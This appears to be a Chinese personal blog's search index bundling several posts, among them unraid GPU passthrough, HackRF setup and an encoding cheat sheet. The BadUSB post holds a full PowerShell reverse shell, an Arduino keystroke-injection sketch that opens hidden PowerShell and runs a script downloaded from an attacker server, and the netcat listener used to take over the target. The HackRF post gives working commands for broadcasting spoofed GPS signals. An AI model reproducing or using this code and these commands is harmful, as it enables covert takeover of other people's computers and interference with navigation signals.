<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>unraid直通显卡</title>
      <link href="/2024/03/06/"/>
      <url>/2024/03/06/</url>
      
        <content type="html"><![CDATA[<h1 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h1><p>本文提供unraid系统下将独立显卡直通给windows10 虚拟机的教程。国内教程少，且不具体，作者参考了部分帖子和油管视频写这篇文章，希望能给玩虚拟机直通的人有帮助。</p><p>本文环境为</p><p>unraid 6.12.8系统</p><p>虚拟机环境为windows 10 后文会贴出详细配置</p><p>显卡为Nvidia Zotac GTX 1070 Ti（这张显卡似乎有点毛病，一个风扇不转了）</p><h1 id="VMS-Manager-设置"><a href="#VMS-Manager-设置" class="headerlink" title="VMS Manager 设置"></a>VMS Manager 设置</h1><p>打开unraid WebUI</p><p>打开<strong>设置</strong> — <strong>虚拟机管理器</strong> 并打开高级视图</p><p>主要设置的就是<strong>PCIe ACS覆盖</strong> 基本设置为两者（both）或者多功能（multi- function）</p><p>VFIO允许不安全的中断可以选择<strong>是</strong></p><p>设置如下图：</p><p><img src="/2024/03/06/1.png" alt="1"></p><p>PCIe ACS覆盖的选择可以多尝试，成功的办法看后一节</p><h1 id="隔离显卡"><a href="#隔离显卡" class="headerlink" title="隔离显卡"></a>隔离显卡</h1><p>打开<strong>工具</strong> — <strong>系统设备</strong> 等待加载一会儿</p><p>可以看到加载出来的<strong>IOMMU group</strong></p><p>从这些组中找到N卡相关的组如图：</p><p>[<img src="/2024/03/06/2.png" alt="2"></p><p>只要能都打上勾，选择绑定，就成功隔离了显卡，这一步成功就代表上面PCIe ACS设置是正确的</p><p>此外，这一步会提示需要重启，重启成功后进行下一步操作。</p><p>重启完以后，unraid仪表盘如果下载有GPU statistics，就已经检测不到显卡了</p><h1 id="设置windows虚拟机"><a href="#设置windows虚拟机" class="headerlink" title="设置windows虚拟机"></a>设置windows虚拟机</h1><p>这一步要安装windows</p><p>无需多言，上配置图：</p><p>首先选择合适的CPU和内存，机器我这边选择i440fx ，Q35兼容性会好点</p><p>BIOS选择SeaBIOS兼容性好</p><p>Hyper-V就是是否虚拟化，选是就行</p><p>usb控制器，打上3.0就行</p><p>然后选择我们的win10镜像，这个镜像直接用ssh工具连上服务器以后传到isos里就可以被识别了</p><p>这个光盘总线都用sata，实测用其他的检测不到，需要加载驱动</p><p>VirtIO驱动很关键，只有它才能给你虚拟机上网，去前文VM Manager设置里下载最新的就行，然后这里能选它</p><p><img src="/2024/03/06/3.png" alt="3"></p><p>接下来是磁盘设置</p><p>我设置了多个盘，一开始测试直接自动就行，总线记得选sata一样的道理，其他的不用改</p><p><img src="/2024/03/06/4.png" alt="4"></p><p>显卡部分，我设置了两个输出</p><p>一个是VNC连接，避免显卡可能输出视频有问题的情况出现，可以先给显卡打上驱动（虽然貌似不会有显卡输出不了的问题，要是有，可以试试插拔一下DP/HDMI接口线）</p><p>第二个就是N卡，Rom BIOS不用填 声卡也选上</p><p>网络资源默认就行，USB设备选择你要连接的外设就行，一般键盘鼠标</p><p><img src="/2024/03/06/5.png" alt="5"></p><h1 id="驱动安装"><a href="#驱动安装" class="headerlink" title="驱动安装"></a>驱动安装</h1><p>安装系统不赘述</p><h2 id="网卡驱动"><a href="#网卡驱动" class="headerlink" title="网卡驱动"></a>网卡驱动</h2><p>安装完，会发现没网络。原因就是网卡驱动没有</p><p>解决办法：加载VirtIO驱动</p><p>打开文件管理器，会发现有个多出的盘，就是VirtIO驱动位置。</p><p>打开设备管理器，选择那个打⚠️的以太网接口，更新驱动，从本地那个VirtIO盘加载就行</p><p>这样就连上网了</p><h2 id="显卡驱动"><a href="#显卡驱动" class="headerlink" title="显卡驱动"></a>显卡驱动</h2><p>简单，上Nvidia官网安装对应驱动就行</p><p>安装完，设备管理器应该能识别到对应的显卡名字了</p>]]></content>
      
      
      
        <tags>
            
            <tag> unraid </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BadUSB制作尝试</title>
      <link href="/2024/01/13/"/>
      <url>/2024/01/13/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文章是作者想要尝试一下近源渗透，于是购买了一个badusb进行制作。网上有不少教程，可惜有的不适配我的硬件，有的程序也过旧了，没有维护。于是自己总结了各路经验写下这个文章，希望感兴趣的可以制作一个自己的BadUsb。</p><h2 id="基本构思"><a href="#基本构思" class="headerlink" title="基本构思"></a>基本构思</h2><p>1.通过烧录指定的程序进入badusb</p><p>2.攻击机开启nc监听服务</p><p>3.目标机插入badusb后，会自动打开终端，并主动连接攻击机，弹出shell，从而攻击机获得控制权</p><h2 id="硬件选择"><a href="#硬件选择" class="headerlink" title="硬件选择"></a>硬件选择</h2><p>查看了各方资料，发现Rubber Ducky和hak5之类的usb确实效果很牛，并且已经集成了功能。但很贵，同时我意在自己制作一个。最后决定购买Arduino Leonardo这款badusb ，我在某鱼上购买，质量还不错。</p><p>badusb的本质是一个单片机，可模拟键盘操作。实际上是一种HID（Human interface device），即人体学接口设备。</p><p>很多类似产品都可以实现该项目。</p><h2 id="环境要求及搭建"><a href="#环境要求及搭建" class="headerlink" title="环境要求及搭建"></a>环境要求及搭建</h2><p>电脑：Windows11+Kali Linux</p><p>云服务器：Debian 1台（局域网内测试可省略）</p><p>攻击机linux需要搭建简单的web下载服务，在此不赘述。</p><p>安装nginx服务后配置nginx.conf即可</p><p>这里作者用kali安装了Arduino用于单片机编程及烧录，事实上什么机子都行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install Arduino</span><br></pre></td></tr></table></figure><p>如果启动失败，大概率需要更新java</p><p>在监听机下安装netcat：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install netcat</span><br></pre></td></tr></table></figure><h2 id="程序编写"><a href="#程序编写" class="headerlink" title="程序编写"></a>程序编写</h2><h3 id="shell连接"><a href="#shell连接" class="headerlink" title="shell连接"></a>shell连接</h3><p>我的主要目标是连接到攻击机的监听端口上去。下面这段程序中,表示创建了一个socket连接到指定的server_ip的server_port端口。同时反向shell连接了攻击机。把这段代码贴到powershell里应该可以直接连上攻击机。</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&#x27;server_ip&#x27;</span>,server_port);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;;<span class="variable">$data</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">&#x27;PS &#x27;</span> + (<span class="built_in">pwd</span>).Path + <span class="string">&#x27;&gt; &#x27;</span>;<span class="variable">$sendbyte</span> = ([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure><p>可以把这段代码放到一个ps1文件里，我命名为crack.ps1。</p><h3 id="Keyboard模拟"><a href="#Keyboard模拟" class="headerlink" title="Keyboard模拟"></a>Keyboard模拟</h3><p>代码作用：</p><p>模拟键盘通讯，按下win+r键，并开启大写锁定以屏蔽输入法。输入指令弹出powershell并最小化，执行服务器上下载的ps1脚本</p><p>这一段话的大小写是相反的，因为实操中发现事实上打出的字大小写会互换</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POWERSHELL -wINDOWsTYLE hIDDEN -cOMMAND &amp; &#123; iNVOKE-eXPRESSION ((nEW-oBJECT nET.wEBcLIENT).dOWNLOADsTRING(&#x27;HTTP://your_server_ip/CRACK.PS1&#x27;)) &#125;</span><br></pre></td></tr></table></figure><p>代码如下：</p><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Keyboard.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;<span class="comment">//初始化</span></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">begin</span>();<span class="comment">//开始键盘通讯</span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">5000</span>);<span class="comment">//延时</span></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_LEFT_GUI);<span class="comment">//win键</span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(<span class="string">&#x27;r&#x27;</span>);<span class="comment">//r键</span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_LEFT_GUI);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">release</span>(<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_CAPS_LOCK);<span class="comment">//利用开大写输小写绕过输入法</span></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_CAPS_LOCK);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">2000</span>);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">println</span>(<span class="string">&quot;POWERSHELL -wINDOWsTYLE hIDDEN -cOMMAND &amp; &#123; iNVOKE-eXPRESSION ((nEW-oBJECT nET.wEBcLIENT).dOWNLOADsTRING(&#x27;HTTP://your_server_ip/DOWNLOADS/RS/CRACK.PS1&#x27;)) &#125;&quot;</span>);  </span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">200</span>);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_RETURN);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">releaseAll</span>();</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_RETURN);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">releaseAll</span>();</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">2000</span>);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_LEFT_GUI);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(<span class="string">&#x27;d&#x27;</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">releaseAll</span>();</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">end</span>();<span class="comment">//结束键盘通讯</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">loop</span><span class="params">()</span><span class="comment">//循环</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="如何烧录"><a href="#如何烧录" class="headerlink" title="如何烧录"></a>如何烧录</h3><p><strong>先将代码里的your_server_ip换成自己的ip</strong>，注意自己配置的下载路径</p><p>将该代码用arduino烧录，注意烧录是选择board为Arduino Leonardo ，Port自查</p><p>点菜单栏里的右箭头即可烧录</p><p><img src="/2024/01/13/arduino.png" alt="arduino"></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="攻击机准备监听"><a href="#攻击机准备监听" class="headerlink" title="攻击机准备监听"></a>攻击机准备监听</h3><p>我的攻击机为kali</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 10080 -k</span><br></pre></td></tr></table></figure><p>该代码的作用是：在10080端口开启一个nc监听，保持连接</p><p>提示，你可能需要开启防火墙</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install ufw</span><br><span class="line">sudo ufw allow 端口号/tcp</span><br><span class="line">sudo ufw <span class="built_in">enable</span></span><br><span class="line">ufw status</span><br></pre></td></tr></table></figure><p><img src="/2024/01/13/nclisten.png" alt="nclisten"></p><h3 id="目标主机插入BadUsb"><a href="#目标主机插入BadUsb" class="headerlink" title="目标主机插入BadUsb"></a>目标主机插入BadUsb</h3><p>目标主机没有安装杀毒软件，但开启windows defender</p><p>现象：延迟5s后打开运行对话框，自动输入指定指令，按下回车后自动执行ps1脚本，同时会把powershell窗口最小化。</p><h3 id="攻击机现象"><a href="#攻击机现象" class="headerlink" title="攻击机现象"></a>攻击机现象</h3><p>usb插入不久后，攻击机上显示已连接上某ip主机，此时按回车会进入powershell，拿下目标主机控制权。</p><p><img src="/2024/01/13/ncconnect.png" alt="ncconnect"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>这次尝试是特殊的，因为其实我之前做的反弹shell并不多，同时这个例子也有一定实际意义。我对于硬件编程有了一定理解，在我将该项目转移使用公网服务器的过程中也遇到了不少挑战。相信以后还可以开发出更好玩的BadUsb。</p><h3 id="亟待解决"><a href="#亟待解决" class="headerlink" title="亟待解决"></a>亟待解决</h3><p>BadUsb肯定是不局限于远程上线的，有更狠的活暂时不会，也有点不敢做，自己以后慢慢研究了。</p><p>BadUsb也可以用来植入木马了，通过powershell 利用certutil可以下载木马等（需要免杀）</p><p>还未测试各类杀毒软件是否会报毒badusb</p>]]></content>
      
      
      <categories>
          
          <category> badusb </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HackRF One伪造GPS信号</title>
      <link href="/2024/01/06/"/>
      <url>/2024/01/06/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>hackrf是可以发送无线电的，加上了时钟模块的板子可以模拟出GPS定位。</p><p>可怜的作者手头没有可用的安卓机子，因此只能发不能测试，只好根据网上的教程来实验一波</p><p>本实验环境基于虚拟机 Kali Linux 2022.2 ARM，hackrf板子需要安装时钟信号模块和发送天线</p><h2 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h2><h3 id="GPS-SDR-SIM安装"><a href="#GPS-SDR-SIM安装" class="headerlink" title="GPS-SDR-SIM安装"></a>GPS-SDR-SIM安装</h3><p>在合适的地方创建一个目录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> GPS_CHEAT</span><br></pre></td></tr></table></figure><p>下载gps-sdr-sim源码</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/osqzss/gps-sdr-sim.git</span><br></pre></td></tr></table></figure><p>安装</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> gps-sdr-sim </span><br><span class="line">sudo gcc gpssim.c lm )3 -o gps-sdr-sim -DUSER_MOTION_SIZE=4000</span><br><span class="line"><span class="built_in">chmod</span> -R 777 gps-sdr-sim</span><br></pre></td></tr></table></figure><h3 id="定位GPS卫星"><a href="#定位GPS卫星" class="headerlink" title="定位GPS卫星"></a>定位GPS卫星</h3><p>前往这个网址</p><p><a href="http://www.igs.gnsswhu.cn/index.php/home/data_product/igs.html">http://www.igs.gnsswhu.cn/index.php/home/data_product/igs.html</a></p><p>下载广播星历</p><p>下载得到类似<code>brdc0050.24n</code>这种文件</p><p>放入之前的文件夹中</p><h3 id="查询经纬度信息"><a href="#查询经纬度信息" class="headerlink" title="查询经纬度信息"></a>查询经纬度信息</h3><p>上各种网站查</p><p>我这边得到一组坐标</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">122.1469258210449,37.44940186081953</span><br></pre></td></tr></table></figure><h3 id="生成欺骗文件"><a href="#生成欺骗文件" class="headerlink" title="生成欺骗文件"></a>生成欺骗文件</h3><p>产生一个gpssim.bin二进制文件</p><p>这个文件里存储的就是我输入的坐标信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./gps-sdr-sim -e brdc0050.24n -l 122.1469258210449,37.44940186081953 -b 8 -o gpssim.bin</span><br></pre></td></tr></table></figure><p><img src="/2024/01/06/gpssimbin.png" alt="gpssimbin"></p><h2 id="发送信息"><a href="#发送信息" class="headerlink" title="发送信息"></a>发送信息</h2><p>准备了那么久终于可以发信号了</p><p>用hackrf_tansfer工具</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 20 -R</span><br></pre></td></tr></table></figure><p>-t 文件名bin文件</p><p>-f 为发送频率 (不修改)</p><p>-s 采样速率 （不修改）</p><p>-a 放大器使能 1/0</p><p>-x 增益分贝 0-47分贝，1dB步长</p><p>-R 重复发送</p><p><img src="/2024/01/06/gpssend.png" alt="gpssend"></p><p>成功发送了，应该是可以被手机接收到的，不过需要断网操作，目前的手机联网后可以自动获取定位信息。</p>]]></content>
      
      
      <categories>
          
          <category> HACKRF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HackRF One 收听FM电台</title>
      <link href="/2024/01/06/"/>
      <url>/2024/01/06/</url>
      
        <content type="html"><![CDATA[<p>刚安装完hackrf环境，可以用这个小实验测试一波硬件是否正常工作。</p><p>这个实验用安装的gqrx操作</p><p>进入gqrx</p><p>第一步</p><p>调节Receiver Options里的选项</p><p>将Mode 调节为WFM mono</p><p>然后调节(向上)Squelch，直到右下角的视图里有波形，此时如果适当调节Gain值，则可以听到滋滋电流声</p><p><img src="/2024/01/06/gqrx_receiver.png" alt="gqrx_receiver"></p><p>第二步</p><p>调频到你所在地区的一个FM频段</p><p>此时调节BB的值，你应该已经可以清楚的听到人声了</p><p>适当调节BF和IF的值，可以使得声音更清晰</p><p>Gain值可以增大声音，但过大会有强烈电流音</p><p><img src="/2024/01/06/hackrf_input.png" alt="hackrf_input"></p><p>没有什么问题的话，这块板子的接收功能还是不错的，在我所在的地区，广播电台的声音相当清楚。</p>]]></content>
      
      
      <categories>
          
          <category> HACKRF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HackRF One 环境安装指南</title>
      <link href="/2024/01/06/"/>
      <url>/2024/01/06/</url>
      
        <content type="html"><![CDATA[<h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p>作者在放假前突发奇想想玩软件无线电，于是乎在某鱼花了点钱购入了一块hackrf板子。算是卖家里面最便宜的一档了，时钟信号模块一并组装好了。</p><h2 id="硬件部分"><a href="#硬件部分" class="headerlink" title="硬件部分"></a>硬件部分</h2><p>这块板子买来，卖家也不知道是什么年产的了，不过外观状况良好。</p><p>以下是各个部件：</p><p>hackrf主体部分带时钟模块</p><p>接收天线</p><p>时钟信号天线</p><p>usb数据线</p><p>注意到hackrf板子是micro-usb连接的，既是供电口，又是数据连接口。</p><p>无需赘述，不懂硬件</p><h2 id="安装软件环境"><a href="#安装软件环境" class="headerlink" title="安装软件环境"></a>安装软件环境</h2><p>作者本来想在ubuntu里安装这些环境，没想到有一点意外无法解决。</p><p>后来还是回到了我熟悉的环境虚拟机Kali Linux 2022.2 ARM中</p><p>kali安装环境很无脑，适合我这样的新手hhh。</p><h3 id="hackrf工具下载"><a href="#hackrf工具下载" class="headerlink" title="hackrf工具下载"></a>hackrf工具下载</h3><p>由于linux自带了hackrf驱动，因此不必下载驱动，直接安装工具即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install hackrf</span><br></pre></td></tr></table></figure><p>安装完成后测试一下虚拟机是否能够正常连接hackrf固件吧</p><p>1.将hackrf板子连接至电脑，指定连接到虚拟机</p><p>2.终端中输入</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hackrf_info</span><br></pre></td></tr></table></figure><p>若出现如下则安装成功，你的板子可以成功连接到电脑了</p><p>插一嘴这个板子是2017年的，6年的板子了，难怪便宜hhh，不过还是好用的（）</p><p><img src="/2024/01/06/hackrf_info.png" alt="hackrf_info"></p><h3 id="gqrx下载"><a href="#gqrx下载" class="headerlink" title="gqrx下载"></a>gqrx下载</h3><p>apt-get方便快捷</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install gqrx-sdr</span><br></pre></td></tr></table></figure><p>在我的机器上，这个软件从终端打开，会提示Connection refused</p><p>直接从开始菜单栏找到gqrx的应用打开即可</p><p>第一次打开，在第一个设备栏里选中hackrf one即可</p><h3 id="GNUradio下载"><a href="#GNUradio下载" class="headerlink" title="GNUradio下载"></a>GNUradio下载</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install gnuradio</span><br></pre></td></tr></table></figure><p>用以下命令运行gnuradio</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gnuradio-companion</span><br></pre></td></tr></table></figure><p>若无法打开，检查命令行报错，一般是报一堆java的错</p><p>检查java版本，更新</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -version</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install default-jdk</span><br></pre></td></tr></table></figure><p>重新打开gnuradio即可</p><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>到这里hackrf的基本环境就算安装完了，后面我预计会研究一下hackrf的小项目，做一些实验，也会同步更新我的博客，欢迎关注</p>]]></content>
      
      
      <categories>
          
          <category> HACKRF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>加密编码(持续更新)</title>
      <link href="/2024/01/03/"/>
      <url>/2024/01/03/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文章收录作者遇到的所有编码或密码。</p><h2 id="如何识别编码？"><a href="#如何识别编码？" class="headerlink" title="如何识别编码？"></a>如何识别编码？</h2><p>识别算法编码类型：</p><p>1.看位数</p><p>2.看特征（数字，字母，大小写，符合）</p><p>3.看当前密文所在地（web，数据库，操作系统）</p><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><p>解码网站：<a href="https://www.cmd5.com">https://www.cmd5.com</a></p><p>32位或16位由“0-9” “a-f”组成的字符串</p><p><strong>md5不可逆</strong></p><p><strong>破解方法</strong>：碰撞、枚举</p><p><strong>salt</strong></p><p>Discuz加盐</p><p>SHA1：与md5差不多，40位</p><h2 id="Base系列"><a href="#Base系列" class="headerlink" title="Base系列"></a>Base系列</h2><p>各类组合传输参数值</p><p>Base64、Base58、Base32、Base16、Base85、Base100等</p><p>提一嘴base100有emoji组成</p><p>可以使用<a href="https://cyberchef.org/解密大多数">https://cyberchef.org/解密大多数</a></p><p>没遇到的看这里www.atoolbox.net</p><h2 id="JS前端加密"><a href="#JS前端加密" class="headerlink" title="JS前端加密"></a>JS前端加密</h2><h3 id="JS颜文字"><a href="#JS颜文字" class="headerlink" title="JS颜文字"></a>JS颜文字</h3><p>一堆颜文字 按f12解密</p><p>解密网站：<a href="https://utf-8.jp/public/aaencode.html">https://utf-8.jp/public/aaencode.html</a></p><h3 id="jother"><a href="#jother" class="headerlink" title="jother"></a>jother</h3><p>只用 ! + ( ) [ ] { }八个字符编码 f12解密</p><p>解密网站：<a href="http://tmxk.org/jother/">http://tmxk.org/jother/</a></p><h3 id="JSFUCK"><a href="#JSFUCK" class="headerlink" title="JSFUCK"></a>JSFUCK</h3><p>只用 ! + ( ) [ ]编码</p><p>解密网站：<a href="http://www.jsfuck.com/">http://www.jsfuck.com/</a></p><h2 id="后端加密"><a href="#后端加密" class="headerlink" title="后端加密"></a>后端加密</h2><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><p>乱码、头部信息</p><p><a href="http://dezend.qiling.org/free.html">http://dezend.qiling.org/free.html</a></p><h4 id="NET"><a href="#NET" class="headerlink" title=".NET"></a>.NET</h4><p>DLL封装代码文件</p><p>用ILSpy</p><p>这个工具下载作者提供链接：<a href="http://114.55.111.231/downloads/ILSpy.zip">http://114.55.111.231/downloads/ILSpy.zip</a></p><h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><p>java&amp;class文件</p><h2 id="数据显示编码"><a href="#数据显示编码" class="headerlink" title="数据显示编码"></a>数据显示编码</h2><p>字符串数据显示编码</p><p>UTF-8/GBK</p><p>这个作者在base64转换时遇到的多，base64转换时候可能出现乱码，试试另一种文字比那吗就可以了</p><h2 id="杂项编码-密码"><a href="#杂项编码-密码" class="headerlink" title="杂项编码/密码"></a>杂项编码/密码</h2><p>本项有待不断补充</p><p>先记录作者做题遇到的吧，经典密码可以放放，比较容易的</p><h3 id="SNOW隐写解密"><a href="#SNOW隐写解密" class="headerlink" title="SNOW隐写解密"></a>SNOW隐写解密</h3><p>这个密码的特征就是一个文件里面有多余的不正常的换行符</p><p>提供下载链接：<a href="http://114.55.111.231/downloads/snow.exe">http://114.55.111.231/downloads/snow.exe</a></p><p>本工具为命令行工具，建立一个文件夹放入snow.exe工具，将要操作的文件放入文件夹中，在这个文件夹中打开终端进行操作。</p><p>操作方法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//加密</span><br><span class="line">snow -C -m &quot;明文&quot; -p &quot;密码&quot; infile outfile</span><br><span class="line">//解密</span><br><span class="line">snow -C -p 密码&quot; file</span><br></pre></td></tr></table></figure><h2 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h2><p>以下工具是作者从网上收集的加解密的一些工具</p><p>超级加解密工具：<a href="http://114.55.111.231/downloads/supersoft.zip">http://114.55.111.231/downloads/supersoft.zip</a></p><p>CTF crack tools：<a href="http://114.55.111.231/downloads/cracktools.zip">http://114.55.111.231/downloads/cracktools.zip</a></p><p>字频统计：<a href="http://114.55.111.231/downloads/frequency.exe">http://114.55.111.231/downloads/frequency.exe</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>数据结构课设-基于C++的RSA工具</title>
      <link href="/2023/12/16/"/>
      <url>/2023/12/16/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本课设是笔者在学校的课程设计上自己构思的，基于c++实现，利用QT可视化。</p><p>本项目已经同步github<br><a href="https://github.com/cyan4run/RSA">https://github.com/cyan4run/RSA</a></p><p>经验不足，有一些算法还没有优化和改进会导致程序卡顿，可能在性能好的机子上会有些优化。</p><p>本项目的一些模块借鉴了其他大佬，如大数运算模块和miller-rabin算法，但是算力可能还是不够。</p><h1 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h1><h2 id="大整数运算模块"><a href="#大整数运算模块" class="headerlink" title="大整数运算模块"></a>大整数运算模块</h2><p>这个模块借鉴了github上部分项目<br>用字符串存取一个大整数，大整数的所有运算在BigInteger.cpp中完成。其中关键的运算是modpow和modInverse函数。这两个函数用于计算RSA。其中对运算符做了重载</p><h2 id="随机素数模块"><a href="#随机素数模块" class="headerlink" title="随机素数模块"></a>随机素数模块</h2><p>随机一个指定位数的模块，但是这个模块即使只做了一次素性检测，在大位时仍然很慢，采用随机素数文件封装在exe中，保证加密效率，但安全性下降。当然，QT工程里primes文件夹里就是我已经预先存储的素数，可以通过python的Crypto库生成随机素数，速度很快。<br>这个算法部分借鉴了某项目。</p><h2 id="RSA模块"><a href="#RSA模块" class="headerlink" title="RSA模块"></a>RSA模块</h2><p>整合了加密，解密模块在一个RSA类中，参见Rsa.cpp，Init函数将会随机生成素数并计算所有相关的RSA的值</p><p>作者一开始写的时候没有想到用户自己填写公钥加密的模块，有兴趣的可以加加。</p><h1 id="部署方案"><a href="#部署方案" class="headerlink" title="部署方案"></a>部署方案</h1><p>本项目即QT工程，直接在QT中打开选择编译架构即可运行。</p><p>封装好的exe文件也一并给出，这个exe是使用Enigma virtual box封装的。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>getPrime.cpp有待优化，但目前够用。<br>各位大佬可以看看优化一下素数算法</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构】排序</title>
      <link href="/2023/11/23/"/>
      <url>/2023/11/23/</url>
      
